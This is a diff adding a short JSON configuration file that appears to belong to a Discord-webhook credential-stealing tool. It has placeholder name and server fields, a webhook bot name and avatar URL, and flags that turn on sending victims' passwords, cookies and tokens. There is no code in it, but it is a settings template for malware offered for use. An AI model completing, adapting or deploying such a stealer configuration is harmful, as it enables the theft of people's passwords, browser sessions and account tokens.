@@ -1,0 +1,33 @@
+{
+    "Title_Configs":[
+        {
+
+           "name": "Your_Name_here",
+           "servername": "Your_Server_Name",
+           "program": "Your_Program_Name"
+
+        }
+    ],
+
+    "Webhook_config":[
+        {
+
+          "Bot_Name": "YourBotName",
+          "Bot_Avatar": "https://media.discordapp.net/attachments/818904459681071126/1008774401648505013/goat6.jpg"
+  
+        }
+    ],
+
+    "Other_Configs":[
+        {
+          "Delay": 0,
+          "SendPasswords": true,
+          "SendCookie": true,
+          "SendToken": "True"
+        }
+    ]
+
+
+
+
+}
